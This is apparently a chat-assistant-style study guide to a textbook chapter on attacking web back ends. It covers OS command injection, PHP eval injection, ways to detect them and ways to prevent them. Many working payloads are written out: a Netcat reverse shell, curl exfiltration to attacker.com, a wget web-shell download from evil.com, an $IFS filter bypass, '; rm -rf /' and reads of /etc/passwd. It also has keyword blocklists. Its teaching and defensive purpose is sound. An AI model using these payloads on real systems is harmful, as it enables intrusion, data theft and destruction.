## 🧠 **Chapter 10 – Attacking Back-End Components (Simplified)**

### 🔍 What This Is About:

Web applications don't just handle your input and show pretty pages. They act like a **middleman** between users and a lot of important stuff on the backend:

* Web servers
* Mail servers
* File systems
* OS-level commands
* Web services (like internal APIs)

These back-end systems are often **protected by the application** itself. But if an attacker can **talk directly** to those components — by tricking the app — they can:

* **Bypass access control**
* **Run unauthorized commands**
* **Read/write files**
* **Control the server**

---

## ⚠️ The Danger: Injection Attacks

The app might trust data that looks safe on the surface. But when passed deeper into the system (backend or OS), that data might be interpreted **differently**.

For example:

* `|`, `&`, `;` are normal characters in a form field...
* But in a shell command? They mean “run another command.”

If the app lets that through → 💥 game over.

---

## 🔨 Section: Injecting OS Commands

### ✅ What Devs *Should* Do:

Use safe APIs like:

* PHP’s `scandir()`
* Python’s `os.listdir()`
* .NET's `Directory.GetFiles()`

These are made for file access, safe and sandboxed.

### ❌ What Devs Sometimes Do:

To solve a problem fast, they do this:

```bash
$command = "dir " + user_input;
```

Which is dangerous if the user\_input is:

```
& del C:\Windows
```

---

## 🧪 Example 1: Perl Command Injection

```perl
my $command = "du -h --exclude php* /var/www/html";
$command = $command . param("dir");
$command = `$command`;
```

**What this does**: Takes a directory name from the user and runs it in the shell.

**What an attacker can do**:

* Instead of typing a directory, they send:

  ```
  /; cat /etc/passwd
  ```
* That changes the command to:

  ```bash
  du -h --exclude php* /var/www/html/; cat /etc/passwd
  ```

**Boom** — now it lists system users.

> Real-World Example:
> HP OpenView had a URL like:
> `https://target:3443/OvCgi/connectedNodes.ovpl?node=a|whoami|`
> That `|whoami|` tricked it into running shell commands.

---

## 🧪 Example 2: ASP / C# Command Injection

```csharp
string dirName = "C:\\filestore\\" + Directory.Text;
ProcessStartInfo psInfo = new ProcessStartInfo("cmd", "/c dir " + dirName);
Process proc = Process.Start(psInfo);
```

If `Directory.Text` is:

```
& whoami
```

Then the final command becomes:

```
cmd /c dir C:\filestore\ & whoami
```

You just tricked the system into running **two** commands.

---

## 🧠 Key Takeaways:

* Avoid passing user input into OS/system commands directly.
* Never trust input, even if it's just a directory name.
* Always **sanitize** or **validate** input.
* Use **language-native APIs** for file access, not shell commands.
* Remember: injected commands run with the **same privileges as the server**.

---

## ❓ Practice Questions (Self-Check Style)

1. What’s the risk of using user input directly in shell commands?
2. Why are APIs safer than using command-line calls?
3. How can shell metacharacters like `|` and `&` be abused?
4. What would happen if the user input is:

   ```
   ; rm -rf /
   ```

   in a vulnerable Perl or ASP example?
5. What is the difference between a safe file listing method and one using shell?

---


## 🔥 Injecting Through Dynamic Execution (Simplified)

### 🧠 What It Means:

Some web languages like **PHP, Perl, and ASP** allow a program to **build and run its own code on the fly** — like making new code and running it *during* runtime.

This is usually done using functions like:

* `eval()` in PHP and Perl
* `Execute()` in Classic ASP

⚠️ These functions are **powerful and dangerous**. If a developer uses them with **user input**, that input can be turned into **real, executable code** on the server.

> Think of it like this:
> If the developer writes:
> `run_this(user_input)` → and `user_input = "delete everything"`
> Then it might just do exactly that.

---

### 🚩 Real-World Vulnerable Code in PHP

```php
$storedsearch = $_GET['storedsearch'];
eval("$storedsearch;");
```

If a user sends:

```
/search.php?storedsearch=$mysearch=wahh
```

This becomes:

```php
eval("$mysearch=wahh;");
```

✅ That’s fine — it's just creating a variable `$mysearch` with the value `wahh`.

---

### ❌ Now Here’s the Hack

What if an attacker sends:

```
/search.php?storedsearch=$mysearch=wahh; system('cat /etc/passwd')
```

That becomes:

```php
eval("$mysearch=wahh; system('cat /etc/passwd');");
```

💥 Boom. You’ve just tricked the server into executing your own command (`system('cat /etc/passwd')`), which dumps the sensitive user list.

---

### 🧪 Another Example Payloads

#### Using `file_get_contents()` (also in PHP):

```bash
/search.php?storedsearch=$x=1; echo file_get_contents('/etc/passwd');
```

#### Using `system()`:

```bash
/search.php?storedsearch=$x=1; system('id');
```

---

### 📝 Note About Other Languages

* **Perl** also has `eval()`
* **Classic ASP** has `Execute()`

In both:

* The idea is the same → user input becomes **runtime code**.
* You may need to URL encode certain characters like `;` → `%3B`

Example:

```
%3Bsystem('id')  ==  ;system('id')
```

---

### 🧠 Key Takeaways

| Concept                 | Meaning                                                                          |
| ----------------------- | -------------------------------------------------------------------------------- |
| `eval()` or `Execute()` | Dynamically executes code at runtime                                             |
| Vulnerability           | If user input is passed to `eval()` unchecked, attacker can run arbitrary code   |
| Attack goal             | Use it to inject OS commands like `system()`, `file_get_contents()`, `cat`, etc. |
| Payload format          | Append malicious command with `;` (or `%3B`) after normal variable setup         |

---

### ❓ Self-Check Questions

1. What is the purpose of the `eval()` function in PHP?
2. Why is passing user input to `eval()` dangerous?
3. What is the difference between:

   * `system('id')`
   * `file_get_contents('/etc/passwd')`
4. What does this payload do?

   ```
   /search.php?storedsearch=$x=1; system('ls /')
   ```
5. Why might you need to URL encode a semicolon (`;`) as `%3B`?

---


## 🧨 Finding OS Command Injection Flaws (Simplified + Practical)

### 🧠 What You’re Doing Here:

You're playing detective — hunting for spots where **user input might sneak into an OS command**.

You're not just looking at obvious fields like "command" or "filename." You're testing **every input**:

* URL params
* Form fields
* Cookies
* Headers

Because any of them could be used in back-end command execution.

---

## 🔬 Step-by-Step Recon (What to Look For)

During app recon (like from Chapter 4):

* Check where the app interacts with the **filesystem**, **executes OS commands**, or calls external tools.
* Even if you don’t *see* a command running, it could still be happening under the hood.

So, treat everything as a suspect until proven innocent.

---

## 🎯 Your Goal: Trigger an OS Command

But not just any command — one that gives you **proof** the server executed what *you* injected.

### Two categories of injection characters:

#### 1. **Command chaining characters**:

Used to **add or chain another command**:

* `;` → run next command unconditionally
* `&` → run next command (Windows)
* `|` → pipe output to another command
* `&&` → run next only if previous command succeeds
* `||` → run next only if previous command fails
* `%0a` → newline (encoded)

#### 2. **Command substitution**:

* `` `command` `` → Run this and insert its result (like in Bash)

---

## 🧪 Testing: Using `ping` for Time-Based Detection

If you **can’t see** command output in the browser, you can still detect command execution using **time delays**, just like **blind SQLi**.

### ✅ Why `ping` works:

* You can force the server to **pause** by making it ping something for X seconds.
* If the app **takes longer to respond**, it might be executing your command.

---

### 🔧 Test Payloads (Paste these into any parameter):

| OS      | Payload                        |                        |                            |
| ------- | ------------------------------ | ---------------------- | -------------------------- |
| Any     | \`                             |                        | ping -i 30 127.0.0.1 ; x\` |
| Windows | \`                             | ping -n 30 127.0.0.1\` |                            |
| Windows | `& ping -n 30 127.0.0.1 &`     |                        |                            |
| Linux   | `; ping -c 10 127.0.0.1 ;`     |                        |                            |
| Linux   | `` `ping -c 10 127.0.0.1` ``   |                        |                            |
| Any     | `%0a ping -c 10 127.0.0.1 %0a` |                        |                            |

Try each payload one by one, across:

* GET/POST params
* Cookie values
* Headers like `User-Agent` or `X-Forwarded-For`

👉 **Measure response time** — if it spikes, you may have command injection.

---

## 🧭 If You Get a Delay — What Next?

### ✅ Step 1: Confirm It’s Real

* Run the delay test a few times.
* Try different delay values (`-n 10`, `-n 20`, `-n 30`)
* Does response time match the delay? Then it’s real.

### ✅ Step 2: Try Visible Commands

```bash
; whoami
; dir
; ls
```

If output is reflected on the page → jackpot. That’s **reflected command injection**.

---

## 🧰 If You Don’t Get Output, Try These:

### 🔁 **Out-of-Band (OOB)**

* Use **Netcat** to get a reverse shell:

  ```bash
  ; nc <your-ip> 4444 -e /bin/bash
  ```
* Or send output to your HTTP listener:

  ```bash
  ; curl http://<your-ip>/?data=`whoami`
  ```

### 💾 **Write output to a file**

```bash
; whoami > /var/www/html/output.txt
```

Then access:
`http://target/output.txt`

Windows:

```cmd
& whoami > c:\inetpub\wwwroot\output.txt
```

---

## 🔒 Privilege Checking

Once you’ve confirmed injection:

* Run `whoami`, `id`, or check group memberships.
* Try writing to protected folders to test privilege level.
* If limited, look for local privilege escalation or SUID binaries.

---

## 🧠 Summary Table

| Task                             | Payload/Command                         |
| -------------------------------- | --------------------------------------- |
| Time delay (Linux)               | `; ping -c 10 127.0.0.1 ;`              |
| Time delay (Windows)             | `& ping -n 10 127.0.0.1 &`              |
| Confirming injection             | `; whoami`                              |
| Get output back (if not visible) | `; whoami > /var/www/html/test.txt`     |
| Out-of-band exfil                | `; curl http://attacker.com/?x=\`id\`\` |

---

## ❓ Self-Check Questions

1. Why is `ping` useful for detecting command injection?
2. What’s the difference between `;`, `&&`, and `||`?
3. What’s the advantage of using backticks (`` `command` ``) in injection?
4. What are signs that your command was **executed** but output was not shown?
5. How can you get command output if it doesn’t appear in the browser?

---

## 🧪 Ready for Lab?

If you want to **practice this in a real lab**, I can help you set up:

* 🧱 A local **PHP command injection box**
* 🧰 **TryHackMe rooms** like:

  * [Injection](https://tryhackme.com/room/commandinjection)
  * [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)
* 🎯 A HackTheBox retired box with command injection


---

## 🛠️ Section: Command Injection Without Metacharacters

### 🧠 Core Idea:

Even if you **can’t inject full commands** (like using `;`, `&&`, or `|`), you can still:

* **Influence command behavior**
* **Redirect output**
* **Write malicious files**
* **Trigger server-side script execution**

> ⚠️ This is how you pivot from "command injection" → "arbitrary file write" → "RCE"

---

### 🧬 Real-World Example: `nslookup` Abuse

A vulnerable app allows users to resolve domain names via:

```bash
nslookup userinput
```

The app blocks `;`, `|`, `&`, etc., but allows:

* `<` (input redirection)
* `>` (output redirection)

So how do you exploit this?

### 🧨 Exploit Strategy:

1. **Inject script payload** as a fake domain name:

   ```bash
   "[% script code %]"
   ```

2. **Redirect command output** to a script file in the web root:

   ```bash
   > /var/www/html/backdoor.jsp
   ```

3. Server executes:

   ```bash
   nslookup "[malicious_code]" > /var/www/html/backdoor.jsp
   ```

4. The error message gets saved into `backdoor.jsp`. It looks like:

   ```jsp
   ** server can't find <% evil JSP shell %>: NXDOMAIN
   ```

5. Since JSP/PHP/ASP engines ignore invalid syntax outside tags, it treats this as:

   * Plain text + Executable script fragment
   * Effectively = **remote file upload**

6. Now visit:

   ```
   http://target.com/backdoor.jsp
   ```

💥 Boom. **You just bypassed command filters and achieved RCE.**

---

## 🧪 Hack Step Breakdown

### ✅ 1. Using `<` and `>` to Read/Write Files

* `<` = feeds a file *into* the command
* `>` = redirects command output *to* a file

Even if you can't inject more commands, you can:

* **Read from file:**

  ```bash
  command < /etc/passwd
  ```
* **Write to file:**

  ```bash
  command > /var/www/html/x.php
  ```

#### 🧠 Why this works:

You’re **not chaining commands**, just modifying what the *existing command* does.

---

### ✅ 2. Exploiting Command-line Parameters

Imagine a feature that uses `wget` like:

```bash
wget userinput
```

### Payload:

```bash
http://evil.com/ -O /var/www/html/webshell.php
```

* `-O` = output file
* You control the input URL and the output location
* So the server fetches a web shell and saves it to the web root

✅ Now visit: `http://target/webshell.php`

**You just turned a file fetcher into a weaponized uploader.**

---

### 🔓 3. Bypassing Space Filtering (🔥 Pro Technique)

Some apps block **spaces**, which makes it hard to:

* Add new arguments
* Write flexible payloads

### Bypass with `$IFS`:

On Linux, `$IFS` is the **Internal Field Separator** — usually a space.

✅ Payload:

```bash
wget$IFShttp://evil.com/x -O$IFS/tmp/pwned.php
```

🚀 Result: Equivalent to:

```bash
wget http://evil.com/x -O /tmp/pwned.php
```

---

## 🎯 Summary Table: Restricted Command Injection Techniques

| Technique                     | How It Works                             |
| ----------------------------- | ---------------------------------------- |
| `>` output redirection        | Write attacker-controlled data to a file |
| `<` input redirection         | Feed file content into command           |
| Using `-O` with `wget`        | Save a malicious file on the server      |
| Using `$IFS` instead of space | Bypass space filtering on UNIX systems   |
| Quoting user input            | Prevent shell parsing errors             |
| Writing to executable folder  | Allows RCE when visited via browser      |

---

## 🧠 Self-Check Questions

1. What’s the purpose of using the `>` character in command injection?
2. How could you leverage a vulnerable `wget` call to achieve RCE?
3. What is `$IFS` and how can it be used in a payload?
4. Why is the error output of `nslookup` useful when redirected to a file?
5. If you can’t run `;`, `|`, or `&`, how else might you manipulate the behavior of an OS command?

---

## Finding Dynamic Execution Vulnerabilities

---

### 🧠 Core Concept:

Dynamic execution = **running code generated at runtime**.

> If user input gets passed into dynamic functions like `eval()` or `Execute()`, an attacker can supply **code**, not just **data**.

This is **not just RCE** — it’s literally **becoming the application logic**.

---

## 🎯 HACK STEPS (Explained Clearly)

---

### ✅ 1. **Check All User Input Locations**

Don’t just test forms — test:

* **Cookies**
* **Hidden fields**
* **Profile settings**
* **Session tokens**
* **Persistent data saved from earlier**

These can be passed silently into `eval()` functions later.

> 🔍 Example:

```http
Cookie: lang=english
```

Server might do:

```php
eval("set_language('$lang')");
```

---

### ✅ 2. **Test Payloads for Echo or Output Injection**

Try each input with payloads like:

```plaintext
;echo 111111
echo 111111
response.write 111111
:response.write 111111
```

These are language-agnostic probes.

---

### ✅ 3. **Look for Output Like:**

```plaintext
111111
```

If you see `111111` **by itself**, not surrounded by other text, that suggests:

* Your input **broke into code context**
* Server evaluated the expression

> 🧠 If you're working in PHP, Perl, or classic ASP — this is a serious signal of `eval()` abuse.

---

### ✅ 4. **If You Don’t See Output, Look for Errors**

Even if `111111` doesn’t appear, check for:

* Stack traces
* Syntax errors (e.g., `unexpected T_STRING`)
* Incomplete rendering

That means **your payload was executed**, but failed due to syntax — which can be fixed with refinement.

---

### ✅ 5. **For PHP: Use `phpinfo()` as a Detection Payload**

```php
/search.php?storedsearch=phpinfo()
```

If you see **a big info dump**, you’ve:

* Successfully executed arbitrary PHP
* Confirmed **full code execution** ability

> 📌 Bonus: `phpinfo()` reveals:

* File paths
* PHP modules
* OS
* Environment variables
* Dangerous settings (like `allow_url_fopen`)

---

### ✅ 6. **Use Time-Based Payloads to Confirm Blind Injection**

If you don’t see output (blind injection), try:

```php
system('ping 127.0.0.1')
```

Or for delayed response:

```php
sleep(10)
```

If response is delayed, even without output → **you’ve got code execution.**

---

## 🧠 Real-World Example: Exploiting a PHP Profile Field

1. Set your profile "bio" field to:

   ```php
   ;phpinfo();
   ```

2. Wait for a page that loads your bio using `eval($user_bio)`

3. Boom — config dump appears.

---

## 🔓 Why This Matters in Pentesting

Dynamic execution bugs are:

* **Silent**
* **Hard to spot**
* **Deadly if found**

They’re often:

* In **admin panels**
* In **plugins or themes** (like WordPress or Joomla)
* In **debug or legacy features**

---

## 🔥 Self-Test Questions:

1. What type of functions in PHP or ASP are vulnerable to dynamic execution attacks?
2. Why is the payload `;echo 111111` used?
3. If `111111` doesn't appear in the output, what else should you check for?
4. What does `phpinfo()` confirm when used successfully in a payload?
5. How can you detect blind dynamic execution if there's no output?

---


## Preventing OS Command & Script Injection

---

### 🔐 Why This Matters

Most web applications **don’t need to call the OS directly**, yet many still do — using functions like `system()`, `exec()`, `shell_exec()`, `eval()`, or `popen()`.

If developers **fail to sanitize user input**, it becomes **code execution with attacker-supplied commands** — and that’s instant game over.

---

## ✅ Key Prevention Strategies

---

### 🔸 1. **Avoid OS Calls Entirely**

> "The best way to prevent OS command injection is to avoid calling out to OS commands."

**Explanation**: Use native functions or libraries instead.

🔍 Example:
Instead of:

```php
system("ping $user_input");
```

Use:

```php
checkdnsrr($user_input); // Native PHP DNS lookup
```

No shell, no injection. Simple.

---

### 🔸 2. **Use a Whitelist**

> "Restrict input to a specific set of expected values."

**Explanation**: Only accept **predefined safe inputs**.

✅ Good:

```php
$allowedDirs = ["logs", "tmp", "config"];
if (!in_array($user_input, $allowedDirs)) {
  die("Invalid input");
}
```

❌ Bad:

```php
$dir = $_GET["dir"];
system("ls $dir"); // wide open
```

---

### 🔸 3. **Enforce Narrow Character Set**

> "Restrict input to alphanumeric characters only."

**Explanation**: Completely reject metacharacters like `;`, `|`, `&`, `<`, `>`, `$`, `\n`, etc.

✅ Use regex like:

```php
if (!preg_match('/^[a-zA-Z0-9]+$/', $user_input)) {
    die("Invalid characters");
}
```

❗ Filtering is *not enough* — but it's a **solid fallback** if used with other protections.

---

### 🔸 4. **Avoid Shells, Use APIs Instead**

> "Use command APIs like Java's `Runtime.exec()` or .NET’s `Process.Start`."

These APIs **bypass the shell entirely**, so metacharacters are not interpreted.

📌 Java Example:

```java
Runtime.getRuntime().exec(new String[]{"ls", "/var/tmp"});
```

📌 C# Example:

```csharp
Process.Start("ls", "/var/tmp");
```

No shell = no `;`, `|`, `&`, or redirection = safe execution.

> ✅ Even if user controls the argument, the command stays isolated and can't be chained.

---

## 🔐 Preventing Dynamic Script Injection

Same logic — but even more dangerous because here we’re **injecting code**, not just commands.

---

### 🔸 1. **NEVER Use `eval()` or `include()` with User Input**

> *“Do not pass user-supplied input to dynamic execution or include functions.”*

✅ Don't do this:

```php
eval($_GET['code']); // dangerous!
```

Instead, structure logic safely:

```php
if ($input === 'english') {
  include("lang/en.php");
}
```

---

### 🔸 2. **Whitelist Known Good Inputs**

Just like OS injection — only accept pre-approved values.

---

### 🔸 3. **Filter Out Dangerous Characters**

If whitelisting isn’t feasible, **blacklist characters that enable injection**, like:

* `;`, `'`, `"`, `(`, `)`, `{`, `}`, `$`, `\`

And even **keywords** like:

* `eval`, `exec`, `include`, `require`, `system`, `base64_decode`

> ✋ But remember: **Filtering ≠ Security.** It's a bandaid — use strict logic and structure first.

---

## 🔁 Real-World Analogy

Imagine giving someone access to a server room with voice commands.

❌ You: “Tell me what you want me to run.”

> Attacker: “Run `rm -rf /` please.”

✅ You: “I only allow ‘list files’ or ‘check status.’”

---

## 🧠 Recap (TryHackMe Style):

| ❓ What to Avoid        | ✅ What to Do Instead                             |
| ---------------------- | ------------------------------------------------ |
| `eval($user_input)`    | Use static logic or controlled flags             |
| `system("ping $host")` | Use `checkdnsrr()` or other internal functions   |
| Unfiltered shell input | Use `Process.Start()` or `Runtime.exec()` safely |
| Regex blacklist        | Prefer **whitelists** (pre-approved values only) |
| Arbitrary includes     | Use logic trees or switch statements             |

---

## 🔐 Practice Qs

1. Why is `system()` dangerous when used with user input?
2. How does using `Process.Start()` or `Runtime.exec()` prevent injection?
3. Why is filtering characters not considered a full protection method?
4. What are better alternatives to `eval()` in dynamic applications?
5. How would you handle input for a `language` parameter safely?

---
